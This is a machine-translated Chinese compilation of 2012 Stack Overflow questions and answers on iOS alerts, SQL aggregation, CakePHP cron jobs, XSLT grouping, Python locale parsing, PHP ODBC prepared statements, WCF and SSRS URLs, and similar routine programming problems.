如果视频上传到 Facebook 失败，我有一个方法会被调用。如果调用该方法，那么我希望 UIAlertView 出现在用户在上传失败时碰巧打开的任何视图控制器中。

这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:02:31.103

`UIAlertView`在应用程序的主窗口上方创建它自己`UIWindow`的，并使其成为关键和可见的。应用程序创建的任何 UIAlertView 都应该在应用程序主窗口的任何视图控制器上可见。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:51:24.453

```
-(void)yourMethod{

        UIAlertView *alert = [[UIAlertView alloc] init];
        [alert setTitle:@"Failed to upload video"];
        [alert setMessage:@"bla bla bla"];
        [alert setDelegate:self];
        [alert addButtonWithTitle:@"Ok"];
        [alert show];
} 
```

那么您可以使用此方法来控制用户单击警报中的按钮后发生的情况：

```
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{
    if (buttonIndex == 0 ){
        //do something
    }else if (buttonIndex == 1){
        //if you add more buttons
        //do something
    }
} 
```

如果您有更多警报视图，则可以在方法中添加一个标签`[alert setTag:(int)]`来识别它们`-(void)alertView``[alertView getTag]`

# php - MySQL 加入加计数加总和

> ID：11235256
> 
> 赞同：1
> 
> 时间：2012-06-27T21:45:24.477
> 
> 标签：php, mysql, join

这是一个复杂的查询，我希望通过一个语句来实现它，而不是在 PHP 中处理数组值。

实现所需的输出：

```
User    Jobs    Total
John D. 5       $1245.67
Mary L. 3       $800.56 
```

到目前为止，这是我的查询：

```
SELECT
  SUM(job.cost) AS sum,
  COUNT(DISTINCT job.user) as count,
  user.id, user.firstname, user.lastname
FROM      `job`
LEFT JOIN `user` ON job.user = user.id
GROUP BY user.id 
```

但是计数值是错误的：它是不同的用户，所以当然每个人都会出错。我该如何解决？

桌子`user`

```
id, name, etc. 
```

桌子`job`

```
id, user, cost 
```

一对多`user`_`job`

* * *

更新

这似乎工作正常：

```
SELECT 
  SUM(job.cost) AS sum,
  COUNT(1) as count,
  user.id, user.firstname, user.lastname
FROM `job`
LEFT JOIN `user` ON job.user = user.id
GROUP BY user.id 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:50:08.780

```
SET @seq = 0;

SELECT place FROM

(SELECT
  @seq := @seq + 1 AS place
  SUM(job.cost) AS sum,
  COUNT(1) as count,
  user.id, user.firstname, user.lastname
FROM      `job`
LEFT JOIN `user` ON job.user = user.id
GROUP BY user.id
ORDER BY COUNT(1) DESC) 

AS list
WHERE list.id = 'my_user_id' 
```

# c# - 使用 SslStream 在 TLS 会话上向客户端发送关闭通知

> ID：11235261
> 
> 赞同：5
> 
> 时间：2012-06-27T21:46:25.220
> 
> 标签：c#, sockets, .net-4.0, ssl

我正在尝试使用 TcpListener over SSL 创建自定义 FTP 服务器。

关闭连接时，客户端会生成错误，因为当套接字关闭时不会发送`close-notify`警报。在 .NET TLS 实现中没有考虑我读过的内容。

将此行为添加到我的服务器的最佳方法是什么。如何发送此警报？将字符串写入 SSL 流或包装流是否简单。

如果有人能指出我正确的方向，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-25T06:25:49.023

我发现 SslStream 根本不支持这个，所以我现在看到的唯一选择是手动发送。这就是我所说的“手动日落”。

我在[这里](https://stackoverflow.com/questions/237807/net-sslstream-doesnt-close-tsl-connection-properly/22626756#22626756)发布了我的代码（因为这是我能找到的最早提到的问题）。如果它对您有帮助，请查看并提供建议。

我希望微软能抽出时间在框架的下一个版本中修复它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T07:23:04.300

`close-notify`如果您是最先关闭的一端，则应在您关闭套接字时由 SSL 层自动发送。如果您是收到 EOS 的一方，因此您正在关闭响应，则[RFC 2246](http://www.ietf.org/rfc/rfc2246.txt)允许`close-notify`不发送响应。

你不能自己发送。

# java - 在列表视图上滚动会创建重复的元数据项

> ID：11235263
> 
> 赞同：0
> 
> 时间：2012-06-27T21:46:42.557
> 
> 标签：java, android, arrays

我正在使用从 JSON 数组中获取的数据填充列表视图。当我在列表视图上滚动时，我得到的元数据正在被复制。

```
 public View getView(int pos, View convertView, ViewGroup parent) {
        View tv;
        TextView t;

        if (convertView == null)
            tv = m_inflater.inflate (R.layout.item, parent, false);
          else
            tv = convertView;

        try {
            t = (TextView) tv.findViewById(R.id.text);
            JSONObject obj = _results.getJSONObject(pos);

            t.setText (obj.getString("title").replaceAll("\\<.*?\\>", ""));

            t = (TextView) tv.findViewById(R.id.created_at);

            JSONObject meta = obj.getJSONObject("meta");

            t.setText (t.getText() + "\n"+ "When:" + "\t"+meta.getString("startDate")+"\n"+"Location:" +"\t" +meta.getString("location")+"\n" +"More Info:"+"\t" +meta.getString("eventURL")+"\n");

        } catch (JSONException e) {

            Log.e("alatta", e.getMessage());
        }
        return tv;
      } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:58:48.783

代替

```
t.setText (t.getText() + "\n"+ "When:" + "\t"+meta.getString( ... 
```

试试这个：

```
t.setText("When:" + "\t"+meta.getString( ...) 
```

这是因为列表视图重用`View convertView`了`tv`列表项对象（

# cakephp - CakePHP 的 Cron 作业路径

> ID：11235265
> 
> 赞同：2
> 
> 时间：2012-06-27T21:47:01.197
> 
> 标签：cakephp, cron, cakephp-2.0, cpanel

我使用共享主机，所以我无法访问 shell。

我有 CronsController，我想运行控制器的索引操作。
从 cpanel 我像这样添加 cronjob：

```
php -q /home/mysite/public_html/app/crons 
```

但这不会运行 crons/index 操作。
我应该如何写到我的 crons 控制器的路径？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:54:16.097

我像这样运行我的 CakePHP cron 作业：

```
curl --silent http://www.example.com/my_controller/my_action 
```

所以我想你可以使用

```
curl --silent http://www.example.com/crons/index 
```

编辑：正如 burzum 提到的，通过控制器运行 cron 作业意味着基本上任何人都可以在他们的浏览器中键入您的 conjob 的 URL 并随时运行它。根据您的 cron 作业的性质，这可能是一个安全风险，如果是这样，您应该使用 burzum 的方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-28T08:56:03.200

> How should I write path to my crons controller?

You should **not** do that at all. If not properly protected *anyone* could trigger your controller from the web. Also that's not what a controller is made for.

**Use a shell** (or a shell command through cpanel for crons)

Assuming that the CakePHP core is in

```
/home/mysite/public_html/lib/ 
```

You should be able to run it like this:

```
/home/mysite/public_html/lib/Cake/Console/cake --app /home/mysite/public_html/app shellName 
```

More details and examples are shown [here](http://book.cakephp.org/2.0/en/console-and-shells/cron-jobs.html).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-24T05:49:26.643

我不确定这是否正确，尽管它对我有用

```
lynx -dump http://example.com/controller/action 
```

# xslt - 如何用一个包围 XHTML 节点组 使用 XSLT 2.0

> ID：11235269
> 
> 赞同：2
> 
> 时间：2012-06-27T21:47:32.550
> 
> 标签：xslt, xhtml, xslt-2.0

我的 XHTML 输入：

```
<h1 class="section">Text</h1>
<h2 class="section">More text</h2> 
```

所需的 XHTML 输出：

```
<div class="section">
<h1 class="section">Text</h1>
<h2 class="section">More text</h2>
</div> 
```

因此，该`group-adjacent`方法似乎是合适的。下面的代码将对`h1`and`h2`节点做正确的事情，但它会删除`<body>`节点中的所有其他内容，包括`<body>`标签本身。

显然我犯了一个错误，但我还不足以`for-each-group`理解它在哪里。

谢谢。

```
<xsl:template match="xhtml:body"> 
    <xsl:for-each-group select="xhtml:h1|xhtml:h2" group-adjacent="@class"> 
        <xsl:choose>
            <xsl:when test="current-grouping-key()='section'">
                <xsl:element name="div">
                    <xsl:attribute name="class">
                        <xsl:value-of select="current-grouping-key()"/>
                    </xsl:attribute>
                    <xsl:apply-templates select="current-group()"/> 
                </xsl:element>
            </xsl:when>
            <xsl:otherwise>
                <xsl:copy-of select="." />    
            </xsl:otherwise>
        </xsl:choose>            
    </xsl:for-each-group>  
</xsl:template> 
```

**更新**：我不明白的是，它`for-each-group`本质上充当了您指向的任何节点的过滤器。因此，如果要保留每个子节点，则原始命令必须包含`select="*"`. 此外，分组规则必须确保每个子节点最终都在一个组中。这意味着`group-adjacent`不是工作的正确工具；`group-starting-with`是。

下面的模板将整个`<body>`XHTML 文件分成以 . 开头的组`h1`。（注意：这个分组规则依赖于 an`h1`总是`<body>`XHTML 中的第一个子节点的假设。）然后我遍历组，使用条件查看每个组中的前两个节点以查看它们是否匹配我的标准。如果是这样，我将它们包装在我的`<div>`.

我仍然对是否有更惯用的 XSLT 解决方案感兴趣，因为我所做的基本上是在 XSLT 中编写 Python。

```
<xsl:template match="xhtml:body"> 
    <xsl:copy>            
    <!--Divide file into groups of nodes starting with h1 tags-->
    <xsl:for-each-group select="*" group-starting-with="xhtml:h1"> 
        <xsl:choose>
            <!-- if the group starts with h1.section + h2.section -->
            <xsl:when test="current-group()[1][@class='section'] and current-group()[2][name() = 'h2'] and current-group()[2][@class = 'section']">
                <!--wrap in a div tag-->
                <div class="section">
                    <xsl:apply-templates select="current-group()[1]"/>
                    <xsl:apply-templates select="current-group()[2]"/>
                </div>                    
                <!--then process the rest of the nodes in this group normally-->
                <xsl:apply-templates select="current-group()[position()>=3]"/> 
            </xsl:when>
            <xsl:otherwise>
                <!--process normally-->
                <xsl:apply-templates select="current-group()"/> 
            </xsl:otherwise>
        </xsl:choose>
    </xsl:for-each-group> 
    </xsl:copy>  
</xsl:template> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T08:05:53.687

在您对问题的更新中，您已经确定了部分答案。但是，可以使用 group-adjacent 解决此类问题。通常的模式是为要包装为一个组的元素计算“true”的分组键，为其他元素计算“false”。所以编码模式是：

```
<xsl:for-each-group select="*" group-adjacent="self::h1 or self::h2">
  <xsl:choose>
    <xsl:when test="current-grouping-key()">
      <div>
        <xsl:copy-of select="current-group()"/>
      </div>
    </xsl:when>
    <xsl:otherwise>
      <xsl:copy-of select="current-group()"/>
    </xsl:otherwise>
  </xsl:choose>
</xsl:for-each-group> 
```

# android - 新的 Google+ google IO 2012 应用幻灯片菜单是如何构建的？

> ID：11235270
> 
> 赞同：0
> 
> 时间：2012-06-27T21:47:33.253
> 
> 标签：android, android-actionbar, slide

新的 Google+ 应用程序已弃用仪表板，取而代之的是幻灯片菜单。我可以理解它是通过两种按需隐藏的布局（菜单和应用程序）完成的。我无法理解的是如何使用操作栏。

不是自动绘制的吗？

他们是否也弃用了操作栏并将其替换为自定义操作栏？

谢谢

# c# - 在函数中使用 Eval("Name")

> ID：11235273
> 
> 赞同：1
> 
> 时间：2012-06-27T21:48:07.017
> 
> 标签：c#, gridview, eval, webforms

我正在使用 .NET 网络表单。我有一个可以在标记中使用 Eval("Name") 的网格视图，它工作正常。但是，我需要对其进行一些计算，因此在后面的代码中我创建了一个名为 FormatName(String name) 的方法。我可以在标记中使用它，当我传递一个字符串时它可以工作，但当我尝试使用 Eval("Name".

`<%# Eval("Name") %>`作品
`< %# FormatName("jim") %>`作品

我正在寻找这样的东西：
`<%# FormatName(Eval("Name"))>%`

这不起作用，但我认为有一些接近。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-27T21:51:28.950

`<%# FormatName(Eval("Name").ToString())>%`应该管用。eval 返回一个对象，而不是字符串。

另一个选项是`EvalText`函数，它将值评估为字符串。

# python - 使用 Python strptime 解析月份名称时出现 UnicodeEncodeError

> ID：11235274
> 
> 赞同：2
> 
> 时间：2012-06-27T21:48:14.000
> 
> 标签：python, datetime, unicode, locale

我必须以 MONTH YEAR 格式解析德语日期，其中 MONTH 是月份的全名。我在 Python 中设置了适当的语言环境，然后尝试使用`strptime`. 例如：

```
locale.setlocale(locale.LC_ALL, "deu_deu") # Locale name on Windows
datetime.strptime(dt, "%B %Y") 
```

在遇到名称中包含非 ASCII 字符的月份时，我得到一个`UnicodeEncodeError`. 日期是从通过 Web 服务交付的 XML 文件中提取的。有没有办法可以将我的日期字符串转换为可以使用的日期字符串`strptime`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:03:08.467

没有答案，只是一个测试（不过在 Unix 上）：

```
>>> import locale, datetime
>>> locale.setlocale(locale.LC_ALL, "de_de")
>>> datetime.datetime.strptime("März 2012", "%B %Y")
datetime.datetime(2012, 3, 1, 0, 0) 
```

以上按预期工作。现在模拟 unicode 作为输入 - März 包含一个[带有 DIAERESIS 的 LATIN SMALL LETTER A](http://www.fileformat.info/info/unicode/char/E4/index.htm)：

```
>>> datetime.datetime.strptime("M\u00E4rz 2012", "%B %Y"))
...
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4' ... 
```

同样可以使用内置的 unicode 函数来*实现：*

```
>>> datetime.datetime.strptime(unicode("März 2012", "utf-8"), "%B %Y")
...
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4' .... 
```

现在尝试使用适当的编码：

```
>>> datetime.datetime.strptime(u"M\u00E4rz 2012".encode('utf-8'), "%B %Y")
datetime.datetime(2012, 3, 1, 0, 0) 
```

同样，这不在 Windows 上 - 所以不是真正的答案，但它可能包含一个提示。

* * *

只是为了进一步调查 - 一个场景，其中一个处理数据外部源（在本示例中使用 JSON，对于 XML 使用 YMMV）：

我认为一个合适的 JSON 编码器会给你 unicode，而[RFC4627](http://www.ietf.org/rfc/rfc4627.txt)似乎暗示了这一点：

> 任何字符都可以转义。如果字符在基本多语言平面（U+0000 到 U+FFFF），那么它可以表示为六个字符序列：一个反斜线，后跟小写字母 u，后跟四个十六进制数字，编码字符的代码点。十六进制字母 A 到 F 可以是大写或小写。

所以用python来模拟（没有人会那样解析JSON，这只是一个模拟）：

```
>>> import json
>>> s = json.dumps({"date" : "März 2012"}).split(":")[1].replace(
        '"', "").replace("}", "").strip().decode("unicode_escape")
>>> # and sure enough ...
>>> datetime.datetime.strptime(s, "%B %Y")
...
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4 ...

>>> # and again, with the right encoding ...
>>> datetime.datetime.strptime(s.encode("utf-8"), "%B %Y")
datetime.datetime(2012, 3, 1, 0, 0) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-19T17:20:36.043

下面的代码解决了这个问题。

```
locale.setlocale(locale.LC_ALL, "deu_deu") # Locale name on Windows
datetime.strptime(dt.encode("iso-8859-16"), "%B %Y") 
```

# android - android image.setImageResource(..) 导致按钮上的文本消失

> ID：11235277
> 
> 赞同：0
> 
> 时间：2012-06-27T21:48:28.620
> 
> 标签：android, android-layout

我在 xml 文件的 TableLayout 中定义了一个按钮和一个图像对象，如下所示：

```
 <Button
                    android:id="@+id/buttonNext"
                    android:layout_width="100dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="0.99"
                    android:gravity="center"
                    android:padding="1sp"
                    android:text="@string/buttonNext"/>
    <ImageView
                    android:id="@+id/ImageView02"
                    android:layout_width="100dp"
                    android:layout_height="fill_parent"
                    android:layout_weight="0.33" 
                    android:src="@drawable/sixthstring"
                    android:contentDescription="@string/chart_description"/> 
```

有一个 OnClickListener 连接到下一个按钮，一切正常。

我为 imageView 创建了一个 OnClickListener 并输入以下代码：

```
 imgChart.setOnClickListener(onChartClick); 
```

. . .

```
 private OnClickListener onChartClick = new OnClickListener()
    {
        @Override
        public void onClick(View v)
        {
            imgChart.setImageResource(R.drawable.newPngImage);
        }
     }; 
```

该应用程序运行良好，即使我单击图像并检索新图像。但是，如果手机休眠然后返回，或者如果我单击菜单按钮（都导致重绘？）下一个按钮的文本*消失**（* imageView 中的图像很好，按钮本身仍然存在） - 很奇怪。

 *如果我注释掉 setImageResource 方法，一切都会再次正常工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-20T00:28:02.063

托尼，你也有同样的问题。我改用“ `setImageDrawable`”，一切都还在他们的位置上，完美无缺！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:56:27.343

使用`setBackgroundResource(id)`代替 `setImageResource(id)`*

# c# - 在进程资源管理器中调试 RtlUserThreadStart

> ID：11235279
> 
> 赞同：5
> 
> 时间：2012-06-27T21:48:46.247
> 
> 标签：c#, multithreading, process-explorer

我有一个基于 3.5 构建的多线程 wpf 应用程序。当我通过 Process Explorer 查看正在运行的线程时，我看到 8 个线程都具有相同的起始地址 ntdll.dll!RtlUserThreadStart，并且所有 8 个线程的 CPU 值都在 3-6+ 之间，并且具有较高的 Cycles Delta。我无法弄清楚这些线程在做什么。它总是相同的线程。它永远不会在应用程序的同一实例中发生变化。当我同时调试我的应用程序并暂停调试器时，所有这些线程都为堆栈显示一行 System.Threading.ConcurrencyScheduler.Scheduler.WaitForWork() 或 System.Threading.Monitor.Wait()。

我为 Visual Studio 启用了符号文件，我在这些线程上看到了以下堆栈：

```
System.Threading.Monitor.Wait() Normal
mscorlib.dll!System.Threading.Monitor.Wait(object obj, int millisecondsTimeout) + 0x19     bytes
System.Threading.dll!System.Threading.ConcurrencyScheduler.Scheduler.WaitForWork() + 0xd0 bytes  
System.Threading.dll!System.Threading.ConcurrencyScheduler.InternalContext.Dispatch() + 0x74a bytes
System.Threading.dll!System.Threading.ConcurrencyScheduler.ThreadInternalContext.ThreadStartBridge(System.IntPtr dummy) + 0x9f bytes 
```

当我查看进程监视器中线程上提供的堆栈时，我看到以下示例：

```
0  ntoskrnl.exe!KeWaitForMultipleObjects+0xc0a
1  ntoskrnl.exe!KeAcquireSpinLockAtDpcLevel+0x732
2  ntoskrnl.exe!KeWaitForSingleObject+0x19f
3  ntoskrnl.exe!_misaligned_access+0xba4
4  ntoskrnl.exe!_misaligned_access+0x1821
5  ntoskrnl.exe!_misaligned_access+0x1a97
6  mscorwks.dll!InitializeFusion+0x990b
7  mscorwks.dll!DeleteShadowCache+0x31ef 
```

或者：

```
0  ntoskrnl.exe!KeWaitForMultipleObjects+0xc0a
1  ntoskrnl.exe!KeAcquireSpinLockAtDpcLevel+0x732
2  ntoskrnl.exe!KeWaitForSingleObject+0x19f
3  ntoskrnl.exe!_misaligned_access+0xba4
4  ntoskrnl.exe!_misaligned_access+0x1821
5  ntoskrnl.exe!KeAcquireSpinLockAtDpcLevel+0x93d
6  ntoskrnl.exe!KeWaitForMultipleObjects+0x26a
7  ntoskrnl.exe!NtWaitForSingleObject+0x41f
8  ntoskrnl.exe!NtWaitForSingleObject+0x78e
9  ntoskrnl.exe!KeSynchronizeExecution+0x3a23
10 ntdll.dll!ZwWaitForMultipleObjects+0xa
11 KERNELBASE.dll!GetCurrentProcess+0x40
12 KERNEL32.dll!WaitForMultipleObjectsEx+0xb3
13 mscorwks.dll!CreateApplicationContext+0x10499
14 mscorwks.dll!CreateApplicationContext+0xbc41
15 mscorwks.dll!StrongNameFreeBuffer+0xc54d
16 mscorwks.dll!StrongNameFreeBuffer+0x2ac48
17 mscorwks.dll!StrongNameTokenFromPublicKey+0x1a5ea
18 mscorwks.dll!CopyPDBs+0x17362
19 mscorwks.dll!CorExitProcess+0x3dc9
20 mscorwks.dll!TranslateSecurityAttributes+0x547f
21 mscorlib.ni.dll+0x8e6bc9 
```

作为该项目的附加说明。我的电脑是一个4核的单CPU。当我们在具有 4 个内核的双 CPU 上运行相同的应用程序时，我们会看到线程数从 8 个变为 16 个。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-28T12:59:42.247

您的问题被严重记录不足，但合理的猜测是您似乎使用了 PPL 库。它保留了一个线程池来完成并行作业。毫无疑问，您会看到高 CPU 周期计数，因为这些线程确实在执行您要求它们执行的工作。

与线程池的典型情况一样，PPL 保留这些线程以供下一项工作执行，这就是您看到它们在 WaitForWork() 上等待的原因。由于缺少调试符号，本机堆栈跟踪是垃圾。RtlUserThreadStart 是一个 Windows 函数，你总是会在非托管堆栈跟踪中看到它，这就是线程启动的方式。

这都是完全正常的。唯一值得注意的其他信息是微软员工发布的[这个答案：](http://social.msdn.microsoft.com/Forums/en-US/parallelcppnative/thread/8542425d-db3e-4334-9cdd-3ff0f5911f24)

> 并发运行时缓存线程以供以后重用。它们仅在所有并发运行时调度程序都已关闭时才被释放。（通常，进程中只有一个默认调度程序）。当排队工作的所有外部线程都退出时，调度程序将关闭。因此，如果主线程调度工作（通过从 main() 调用 parallel_for 说），那么默认调度程序将仅在进程关闭时被删除。
> 
> 缓存线程数有上限。它大约是机器上内核数量的 4 倍（尽管还有一些其他因素会影响阈值，例如调度程序策略中的堆栈大小选项）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-09-18T12:32:11.243

我找出了导致这些处于等待状态的线程上 CPU 利用率高的原因。我还不知道为什么会这样。当我们的应用程序是 .NET 3.5 应用程序时，有人在这里找到并利用了一个可用的线程程序集，该程序集有人向后移植或来自 .NET 4.0/4.5 的东西用于 3.5。这显然在 Parallel.ForEach 调用或其他方面存在缺陷。当我调用这个调用时，我最终会在循环之后等待这些线程等待，消耗 CPU。我们与 Microsoft 确认这些线程实际上只是在等待。现在我们是 4.0，我已经切换到 4.0 可用的任务库，问题已经消失。当我有机会查看是否可以提供发生这种情况的具体原因时，我将尝试调试到库中。

# gdata - 在 GoogleDocs 中使用 changestamp（空 changestamp）

> ID：11235282
> 
> 赞同：0
> 
> 时间：2012-06-27T21:48:50.803
> 
> 标签：gdata, google-docs-api, google-drive-api

我正在尝试找到最大更改戳，以便我可以开始使用它。我尝试了以下方法：

```
URL url = "https://docs.google.com/feeds/default/private/changes?v=3"
ChangelogFeed foo = service.getFeed(url, ChangelogFeed.class);
LargestChangestamp stamp = foo.getLargestChangestamp(); 
```

邮票始终为空。

这是获得最大更改戳的方法，还是我需要先设置它才能使用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T15:36:16.427

这似乎是 API 中的一个错误。我通过从 ChangelogFeed 中获取 ChangelogEntrys 获得了变更戳：

```
List<ChangelogEntry> entries = foo.getEntries();
    for (ChangelogEntry entry: entries) {
    String blob = entry.getXmlBlob().getBlob();
    System.out.println("Blob: " + blob);
} 
```

条目的更改戳包含在其 blob 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T16:10:27.373

用户元数据提要中也提供了最大的更改戳。[请参阅此处](https://developers.google.com/google-apps/documents-list/#getting_general_information_about_a_users_account)的响应协议选项卡中的“docs:largestChangestamp”元素，

我不确定java api是否直接公开了最大的Changestamp属性——上次我检查它隐藏在xmlBlob属性中，我必须做一个xml解析才能把它拿出来。

# javascript - Apycom 菜单更改子菜单 css 属性（颜色）

> ID：11235283
> 
> 赞同：0
> 
> 时间：2012-06-27T21:48:53.133
> 
> 标签：javascript, jquery, css, menu, obfuscation

如何更改 Apycom 菜单中的子类别菜单属性？我对 CSS 所做的一切只会影响元菜单。我认为这可能是他们混淆的 javascript 文件业务，但我如何在使用非商业版本时更改它？

# php - 我永远无法执行 SQL 安全查询？

> ID：11235292
> 
> 赞同：4
> 
> 时间：2012-06-27T21:49:59.943
> 
> 标签：php, sql, odbc, sql-server-2000

我正在使用 PHP 中的 ODBC 扩展来连接到 SQL 2000 服务器。这是我所反对的：

1.  `odbc_exec()`我可以使用OR执行查询
2.  我可以执行查询`odbc_execute()`

在我看来，这两种查询执行方法之间的差异几乎就像白天和黑夜一样：

1.  `odbc_exec()`将执行非 SQL 安全查询并返回查询结果
2.  `odbc_execute()`与 结合使用`odbc_prepare()`以对数据库执行 SQL 安全查询。但是，`odbc_execute()`它只能返回一个布尔值，因此不能用于从语句返回结果，或检查从or语句`SELECT`更新了多少行`UPDATE``DELETE`

这真的是这一切的工作方式，还是有一些方法可以转义值以供使用`odbc_exec()`或从中获取结果`odbc_execute()`？

PHP 文档似乎没有解决上述困境的任何解决方案。

感谢您的时间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T21:52:21.823

您正在运行的查询的资源由 odbc_prepare 函数返回，而不是 odbc_execute。

这两个代码块做同样的事情：

```
$query=odbc_exec("SELECT * FROM table WHERE userinput=".$hopefully_escaped_user_input);
while($row=odbc_fetch_array($query) {
  //do stuff with $row
}

$query=odbc_prepare("SELECT * FROM table WHERE userinput=?");
odbc_execute($query,Array($user_input);
while($row=odbc_fetch_array($query) {
  //do stuff with $row
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T21:54:42.900

准备好的语句与“指向”准备好的语句的资源结合使用。

将准备好的语句想象成您在 SQL 中定义的函数/过程，然后使用资源“调用”该函数。

[这里](http://www.php.net/manual/en/function.odbc-prepare.php#71616)的例子：

```
<?php
$res = odbc_prepare($db_conn, $query_string);
if(!$res) die("could not prepare statement ".$query_string);

if(odbc_execute($res, $parameters)) {
    $row = odbc_fetch_array($res);
} else {
    // handle error
}
?> 
```

# jquery - 无法从 jQuery 调用 WCF Restful 服务

> ID：11235294
> 
> 赞同：1
> 
> 时间：2012-06-27T21:50:15.037
> 
> 标签：jquery, wcf

以下是我的 jQuery 脚本代码：

```
 $(document).ready(function () {
          $.ajax({
              cache: false,
              type: "GET",
              async: true,                  
              dataType: "json",
              url: "http://localhost:9002/SampleServices/Service/REST/Employees",                  
              processdata: false,                  
              error: ServiceFailed,
              success: function () { alert("succeeded");   }
          });
      });

      function ServiceFailed(result) {
          alert('Service call failed: ' + result.status + '' + result.statusText);
          Type = null;
          Url = null;
          Data = null;
          ContentType = null;
          DataType = null;
          ProcessData = null;
      }

      function ServiceFailed(xhr) {
          alert("error");
          alert(xhr.responseText);
          if (xhr.responseText) {
              var err = xhr.responseText;
              if (err)
                  error(err);
              else
                  error({ Message: "Unknown server error." })
          }
          return;
      } 
```

当我运行上面的代码时，它总是输入 ServiceFailed(xhr) 并警告“错误”。

当我尝试通过浏览器执行上述 url ("http://localhost:9002/SampleServices/Service/REST/Employees") 时，我得到以下 JSON 响应：{"page":1,"records":1," rows":[{"cell":["1","Haris","21-03-1979","HR"],"id":1}],"total":1}

当我运行 jQuery 脚本时，提琴手说：

```
#   Result  Protocol    Host    URL Body    Caching Content-Type    Process Comments    Custom  
1   200 HTTP    localhost:9002  /SampleServices/Service/REST/Employees?_=1340833203960  89      application/json; charset=utf-8 chrome:1448 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T06:49:43.007

卡洛斯菲盖拉做到了。

这是一个跨域请求，因此我需要在 App.config 文件中为我的 WCF 服务添加跨域支持

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:55:56.220

从[文档](http://api.jquery.com/jQuery.ajax/)中，错误回调函数接受三个参数：`jqXHR`、`textStatus`和`errorThrown`。

您的方法只有一个参数。您应该首先让您的错误方法采用三个参数并检查它们的值。

# ftp - 传输 SFTP：无法上传文件错误

> ID：11235296
> 
> 赞同：-1
> 
> 时间：2012-06-27T21:50:25.737
> 
> 标签：ftp, sftp

我正在使用 Transmit for Mac 作为 SFTP。它工作正常。当我尝试上传或编辑任何文件时，它突然开始显示此错误![在此处输入图像描述](../Images/234f2e8965a5d853bc5ed0014280a397.png)

我该如何解决这个错误？

这是控制台显示的内容： ![在此处输入图像描述](../Images/0efef9e8b936fcd9600c7cd36451e4f1.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T06:21:17.337

我使用终端跟踪问题，发现服务器已满。

# mongodb - 尝试从 iReport 4.5.1 连接到 mongo 时收到错误

> ID：11235300
> 
> 赞同：0
> 
> 时间：2012-06-27T21:50:43.720
> 
> 标签：mongodb, ireport, designer, master-slave

我正在尝试使用 iReport 设计器 4.5.1 (jasper) 上的 mongo 连接器创建报告。当我创建连接并对其进行测试时，它显示测试成功并为我提供了我在 mongo 中连接到的数据库。当我尝试在 iReport 的报告查询中使用连接并尝试在执行任何更复杂的操作之前仅读取字段时，就会出现此问题。它给了我以下消息，“错误：不与主人交谈并重试用完”。当我直接连接到服务器时，我能够连接和查询，部分原因可能是我执行 rs.slaveOk() 从从节点获取数据，我的问题是我是否通过 iReport 连接到 mongo我发出此命令或将其作为参数传递。我已经查看了以下链接中的文档，但找不到与此相关的任何内容： [http://jasperforge.org/plugins/mwiki/index.php/Bigdatareportingfornosqlandhadoop/MongoDB](http://jasperforge.org/plugins/mwiki/index.php/Bigdatareportingfornosqlandhadoop/MongoDB)

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T07:41:09.077

您可以将 ?slaveOk=true 或任何其他[MongoDB 连接字符串选项](http://www.mongodb.org/display/DOCS/Connections)添加到 iReport 中的连接 URI，例如：

```
mongodb://localhost:27017/test?slaveOk=true 
```

# reporting-services - URL 中的 SSRS 日期时间参数

> ID：11235302
> 
> 赞同：3
> 
> 时间：2012-06-27T21:50:52.737
> 
> 标签：reporting-services

我正在传递以下 URL，以便在 SSRS 中加载报告。报告中有两个参数：

```
http://servername/Reports/Pages/Report.aspx?ItemPath=%2fReports%2fApplications%2fPersonnel%2fRptNameChange&ssn=#########&txtEffectiveDate=06/01/2012

```

**参数**

1.  字符串 - ssn
2.  日期时间 - txtEffectiveDate

但是，当页面加载时，就好像无法识别参数一样，它会加载参数中包含空字段的页面。

URL 有什么遗漏或不正确的地方？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T07:21:24.880

你这么近！您应该能够通过将 Report.aspx 更改为 ReportViewer.aspx 来实现这一点。例如，见下文：

```
http://servername/Pages/**ReportViewer.aspx?**ItemPath=%2fReports%2fApplications%2fPersonnel%2fRptNameChange&ssn=#########&txtEffectiveDate=06/01/2012 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-29T15:43:50.490

我调用的是报表管理器 URL，而不是 Web 服务 URL。

这是 SSRS Url 的工作版本： `http://servername/ReportServer?/Folder1/Folder2/Folder3/`

为了完成对 SSRS Web 服务 URL 的调用，请附上报告名称和运行报告所需的任何参数：

